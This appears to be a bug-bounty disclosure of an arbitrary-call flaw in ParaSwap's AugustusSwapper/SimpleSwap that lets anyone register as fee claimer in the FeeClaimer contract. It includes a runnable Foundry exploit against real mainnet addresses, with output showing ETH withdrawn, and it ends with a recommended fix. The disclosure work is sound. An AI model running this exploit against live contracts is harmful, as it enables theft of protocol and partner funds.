**Description**\
Anyone can execute arbitrary calls as the AugustusSwapper (`msg.sender`) using the delegatecalled [simpleSwap(...)](https://etherscan.io/address/0x66C1c25d7D2bd4A32Ed33501E202B275030f402C#code#F1#L42) method of the SimpleSwap contract. The only exceptions are calls to [ERC20.transferFrom](https://etherscan.io/address/0x66C1c25d7D2bd4A32Ed33501E202B275030f402C#code#F1#L245) or calls to the [tokenTransferProxy](https://etherscan.io/address/0x66C1c25d7D2bd4A32Ed33501E202B275030f402C#code#F1#L235) contract.  
Although this a dangerous vulnerability on its own, it's hard to find immediate impacts, since the AugustusSwapper is not supposed to hold any assets.  

This only becomes dangerous when the AugustusSwapper has special rights/roles in other contracts. I already found once instance where this is the case which led to the current vulnerability.  

The [registerFee(...)](https://etherscan.io/address/0xeF13101C5bbD737cFb2bF00Bbd38c626AD6952F7#code#F1#L47) method of the FeeClaimer contract is only callable by the AugustusSwapper.  
As a consequence, an attacker can craft calls using `simpleSwap(...)` where he registers himself as claimer for *all*  unallocated fees/assets of the FeeClaimer contract. Subsequently, those fees/assets can be withdrawn by the attacker leading to a loss for the protocol and/or partners.

**Attack Scenario**
1. Craft a call to `AugustusSwapper/SimpleSwap.simpleSwap(...)` which actually calls `FeeClaimer.registerFee(...)` under the hood to register the attacker as fee claimer for an asset of choice.
2.  Execute the crafted "simple swap".
3.  Withdraw fees for the registered asset.
4.  Repeat with every available asset in the contract.

**Proof of Concept**

The following code is the main test file of a runnable PoC (using Foundry) which proves the above attack scenario, i.e. loss of funds.  
I am willing to provide the whole PoC project upon request.  

Nevertheless, this PoC also serves as a more detailed step-by-step description about how to execute the attack.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/tokens/Tokens.sol";
import "../src/external/interfaces/ISimpleSwap.sol";
import "../src/external/interfaces/IFeeClaimer.sol";

contract ParaswapHack is Test {
    uint256 mainnetFork;

    ISimpleSwap public augustusSwapper;
    IFeeClaimer public feeClaimer;

    function setUp() public {
        mainnetFork = vm.createFork("https://mainnet.infura.io/v3/<YOUR API KEY HERE>");
        vm.selectFork(mainnetFork);

        // AugustusSwapper: https://etherscan.io/address/0xDEF171Fe48CF0115B1d80b88dc8eAB59176FEe57
        // calls SimpleSwap via 'delegatecall': https://etherscan.io/address/0x66C1c25d7D2bd4A32Ed33501E202B275030f402C
        augustusSwapper = ISimpleSwap(0xDEF171Fe48CF0115B1d80b88dc8eAB59176FEe57);

        // https://etherscan.io/address/0xeF13101C5bbD737cFb2bF00Bbd38c626AD6952F7
        feeClaimer = IFeeClaimer(0xeF13101C5bbD737cFb2bF00Bbd38c626AD6952F7);
    }


    function testClaimFees() public {
        // build minimum 'SimpleSwap' data in order to execute 'FeeClaimer.registerFee'
        ISimpleSwap.SimpleData memory swapData;
        swapData.deadline = block.timestamp;

        // use this contract as mock token
        swapData.toAmount = 1;
        swapData.fromToken = address(this);
        swapData.toToken = address(this);

        // set 'FeeClaimer' address
        address[] memory callees = new address[](1);
        callees[0] = address(feeClaimer);
        swapData.callees = callees;

        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        swapData.values = values;

        // build 'FeeClaimer.registerFee' call for this contract to claim ETH
        swapData.exchangeData = abi.encodeCall(IFeeClaimer.registerFee, (address(this), address(EthereumTokens.ETH), type(uint256).max));

        uint256[] memory startIndexes = new uint256[](2);
        startIndexes[0] = 0;
        startIndexes[1] = swapData.exchangeData.length;
        swapData.startIndexes = startIndexes;
        
        // execute 'FeeClaimer.registerFee' call as 'AugustusSwapper'
        augustusSwapper.simpleSwap(swapData);

        // steal ETH from 'FeeClaimer'
        uint256 balanceBefore = address(this).balance;
        feeClaimer.withdrawAllERC20(address(EthereumTokens.ETH), address(this));
        uint256 balanceAfter = address(this).balance;

        console.log("ETH balance increase :", balanceAfter - balanceBefore);
    }


    // Mock required ERC20 methods to trick 'SimpleSwap' into succeeding
    function transferFrom(address from, address to, uint256 amount) external returns (bool)
    {
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool)
    {
        return true;
    }

    function balanceOf(address account) external view returns (uint256)
    {
        return 1;
    }

    // receive ETH from FeeClaimer
    receive() payable external {}
}
```

Output as of 2023-09-29:
```shell
Running 1 test for test/ParaswapHack.t.sol:ParaswapHack
[PASS] testClaimFees() (gas: 63924)
Logs:
  ETH balance increase : 6597359717862898
```

**Recommendation**
 
I recommend to additionally prohibit calls to the FeeClaimer contract in [L235](https://etherscan.io/address/0x66C1c25d7D2bd4A32Ed33501E202B275030f402C#code#F1#L235) of the SimpleSwap contract in order to mitigate the current issue.  

However, this solution is pretty tailored to the current attack. I'll keep researching if this (nearly) arbitrary execution through SimpleSwap provides further attack vectors and might be able to provide a better recommendation once we get in touch.

